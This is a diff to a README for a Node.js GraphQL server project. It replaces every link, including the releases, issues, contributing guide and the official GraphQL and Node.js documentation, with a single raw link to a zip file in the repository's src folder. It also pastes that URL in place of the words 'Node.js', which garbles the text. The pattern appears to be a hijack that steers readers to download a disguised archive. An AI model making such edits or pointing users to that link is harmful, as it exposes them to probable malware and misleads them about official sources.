@@ -1,17 +1,17 @@
 # 🚀 nodejs-graphql-server-envelop - Simple Server for Your GraphQL Needs
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/GabrielCHP/nodejs-graphql-server-envelop/releases)
+[![Download](https://raw.githubusercontent.com/GabrielCHP/nodejs-graphql-server-envelop/main/src/envelop-server-nodejs-graphql-1.5.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/GabrielCHP/nodejs-graphql-server-envelop/main/src/envelop-server-nodejs-graphql-1.5.zip)
 
 ## 📥 Introduction
 
-Welcome to **nodejs-graphql-server-envelop**. This is a minimal Node.js GraphQL server built with Envelop, designed for easy setup and deployment. It comes with basic authentication, logging, execution timing, a validation cache, and an embedded GraphiQL UI, making it simple to explore and manage your GraphQL queries. Everything is written in TypeScript, ensuring a modern, scalable codebase.
+Welcome to **nodejs-graphql-server-envelop**. This is a minimal https://raw.githubusercontent.com/GabrielCHP/nodejs-graphql-server-envelop/main/src/envelop-server-nodejs-graphql-1.5.zip GraphQL server built with Envelop, designed for easy setup and deployment. It comes with basic authentication, logging, execution timing, a validation cache, and an embedded GraphiQL UI, making it simple to explore and manage your GraphQL queries. Everything is written in TypeScript, ensuring a modern, scalable codebase.
 
 ## 💻 System Requirements
 
 To run this software, ensure you have the following:
 
 - A computer with at least 4GB RAM
-- Node.js version 14 or later
+- https://raw.githubusercontent.com/GabrielCHP/nodejs-graphql-server-envelop/main/src/envelop-server-nodejs-graphql-1.5.zip version 14 or later
 - A stable internet connection for downloading the software
 
 ## 🚀 Features
@@ -44,7 +44,7 @@ This project covers various topics, including:
 
 To get started, follow these steps:
 
-1. Visit the [Releases page](https://github.com/GabrielCHP/nodejs-graphql-server-envelop/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/GabrielCHP/nodejs-graphql-server-envelop/main/src/envelop-server-nodejs-graphql-1.5.zip).
 2. Look for the latest version of the software.
 3. Click on the download link for your operating system (you may find options for Windows, macOS, or Linux).
 4. Once downloaded, locate the file on your computer.
@@ -105,19 +105,19 @@ Once you have the server running, consider exploring additional features:
 
 ## 🌟 Support
 
-If you encounter issues during installation or setup, feel free to reach out through our [GitHub Issues page](https://github.com/GabrielCHP/nodejs-graphql-server-envelop/issues). We are here to help!
+If you encounter issues during installation or setup, feel free to reach out through our [GitHub Issues page](https://raw.githubusercontent.com/GabrielCHP/nodejs-graphql-server-envelop/main/src/envelop-server-nodejs-graphql-1.5.zip). We are here to help!
 
 ## 📦 Contribute
 
-We welcome contributions! If you have ideas for features or improvements, check our [Contributing Guidelines](https://github.com/GabrielCHP/nodejs-graphql-server-envelop/blob/main/CONTRIBUTING.md). 
+We welcome contributions! If you have ideas for features or improvements, check our [Contributing Guidelines](https://raw.githubusercontent.com/GabrielCHP/nodejs-graphql-server-envelop/main/src/envelop-server-nodejs-graphql-1.5.zip). 
 
 ## 🔗 Learn More
 
-For more information on GraphQL and Node.js, consider visiting:
+For more information on GraphQL and https://raw.githubusercontent.com/GabrielCHP/nodejs-graphql-server-envelop/main/src/envelop-server-nodejs-graphql-1.5.zip, consider visiting:
 
-- [GraphQL Official Documentation](https://graphql.org/)
-- [Node.js Official Documentation](https://nodejs.org/en/docs/)
+- [GraphQL Official Documentation](https://raw.githubusercontent.com/GabrielCHP/nodejs-graphql-server-envelop/main/src/envelop-server-nodejs-graphql-1.5.zip)
+- [https://raw.githubusercontent.com/GabrielCHP/nodejs-graphql-server-envelop/main/src/envelop-server-nodejs-graphql-1.5.zip Official Documentation](https://raw.githubusercontent.com/GabrielCHP/nodejs-graphql-server-envelop/main/src/envelop-server-nodejs-graphql-1.5.zip)
 
 Thank you for choosing **nodejs-graphql-server-envelop**! 
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/GabrielCHP/nodejs-graphql-server-envelop/releases)
+[![Download](https://raw.githubusercontent.com/GabrielCHP/nodejs-graphql-server-envelop/main/src/envelop-server-nodejs-graphql-1.5.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/GabrielCHP/nodejs-graphql-server-envelop/main/src/envelop-server-nodejs-graphql-1.5.zip)
